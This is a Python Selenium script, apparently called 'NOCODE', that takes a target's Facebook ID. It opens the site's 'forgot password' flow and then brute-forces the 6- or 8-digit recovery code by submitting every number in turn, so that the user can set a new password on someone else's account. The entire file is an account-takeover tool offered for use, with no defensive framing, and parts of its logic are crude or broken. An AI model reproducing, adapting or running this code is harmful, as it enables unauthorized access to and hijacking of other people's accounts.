# import modules
print("\nLoading modules...")
print("This extened version still in beta...")

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import os
from selenium.common.exceptions import NoSuchElementException, StaleElementReferenceException
from bs4 import BeautifulSoup
import requests
import re

def banner():
    os.system("cls")
    print('''                              
                         _   _  ___   ____ ___  ____  _____ 
                        | \ | |/ _ \ / ___/ _ \|  _ \| ____|
                        |  \| | | | | |  | | | | | | |  _|  
                        | |\  | |_| | |__| |_| | |_| | |___ 
                        |_| \_|\___/ \____\___/|____/|_____|
                                    
                   
                                 
                                   by ThienStai
    ''')



try:
    banner()
    target = input("\n\nEnter the account ID/username = ")
    banner()
    #--------------------------------------handle the driver-----------------------------------------------#

    print("\n\nDownload the driver and put it in the same folder with this app")
    print("Detecting drivers in current folder: " + os.getcwd() + "...")
    # detect edge                            edge exist                           chrome not exist
    if os.path.isfile(os.path.join(os.getcwd(), "msedgedriver.exe")) and not os.path.isfile(os.path.join(os.getcwd(), "chromedriver.exe")):
        print("Found Edge driver")
        br_option = input("Are you want to continue?\n>")
        if br_option.lower() == "y" or br_option.lower() == "yes":
            browser = webdriver.Edge(executable_path=".\\msedgedriver.exe")
            banner()
        else:
            print("Please enter full path for edge driver")
            PATH = input("It's in ")
            browser = webdriver.Edge(executable_path=PATH)
            banner()
    #detect chrome                            edge not exist                          chrome exist
    elif not os.path.isfile(os.path.join(os.getcwd(), "msedgedriver.exe")) and os.path.isfile(os.path.join(os.getcwd(), "chromedriver.exe")):
        print("Found Chrome driver")
        br_option = input("Are you want to continue?\n>")
        if br_option.lower() == "y" or br_option.lower() == "yes":
            browser = webdriver.Chrome(executable_path=".\\chromedriver.exe")
            banner()
        else:
            print("Please enter full path for Chrome driver")
            PATH = input("It's in ")
            browser = webdriver.Chrome(executable_path=PATH)
            banner()
    elif os.path.isfile(os.path.join(os.getcwd(), "msedgedriver.exe")) and os.path.isfile(os.path.join(os.getcwd(), "chromedriver.exe")):
        print("Found both edge and chrome driver, choose which?\n")
        print("E  -------  Edge")
        print("C  -------  Chrome")
        br_option = input("\nI choose ")
        if br_option.lower() == "c" or br_option.lower() == "chrome":
            print("Set to chrome")
            browser = webdriver.Chrome(executable_path=".\\chromedriver.exe")
            banner()
        else:
            print("Set to edge")
            browser = webdriver.Edge(executable_path=".\\msedgedriver.exe")
            banner()
    else:
        print("Unable to locate the driver...")
        print("Choose the broser type?\n")
        print("E  -------  Edge")
        print("C  -------  Chrome")
        br_option = input("\nI choose ")
        if br_option.lower() == "c" or br_option.lower() == "chrome":
            PATH = input("FULL PATH to chrome driver = ")
            browser = webdriver.Chrome(executable_path=PATH)
            banner()
        else:
            PATH = input("FULL PATH to edge driver = ")
            browser = webdriver.Edge(executable_path=PATH)
            banner()

    #--------------------------------------------------------------------------------------------------------#


    browser.get(url="https://www.facebook.com")
    print("Opening facebook...")
    banner()

    # locate the email elm
    browser.find_element_by_id("email").send_keys(target)
    print("Typed target id..")
    banner()

    # click the "next" button
    browser.find_element_by_id("u_0_b").click()
    print('Clicked the "next" button...')
    sleep(4)
    banner()

    # click the next button:
    browser.find_element_by_css_selector("#loginform > div:nth-child(15) > div._9ay7 > a").click()
    sleep(3)
    print("Clicked the 'Forget password' button...")
    browser.find_element_by_name("reset_action").click()
    banner()
    print("Clicked the 'next' button...")

    # locate the code input
    sleep(3)
    code_input = browser.find_element_by_id("recovery_code_entry")
    banner()

    # check if code is 6 or 8 digits
    print("You get 6 or 8 digits code?")
    digit_option = int(input("I get "))
    if digit_option == 6:
        print("6 digits word list loaded!")
        banner()
        for i in range(1,999999):
            sleep(0.15)
            word = "0" * (6 - len(str(i)))
            word = word + str(i)
            code_input.send_keys(word)
            code_input.send_keys(Keys.ENTER)
            print("Tested word: " + word)

    else:
        print("8 digits word list loaded!")
        banner()
        for i in range(1,99999999):
            sleep(0.2)
            word = "0" * (8 - len(str(i)))
            word = word + str(i)
            code_input.clear()
            code_input.send_keys(word)
            code_input.send_keys(Keys.ENTER)
            print("Tested word: " + word)


    banner()
    print("It's time to setup a new password")
    input("Press Enter to continue...")
    sleep(1000)

except NoSuchElementException:
    banner()
    print("NoSuchElementException")
    sleep(2)
    exit()
except StaleElementReferenceException:
    pass
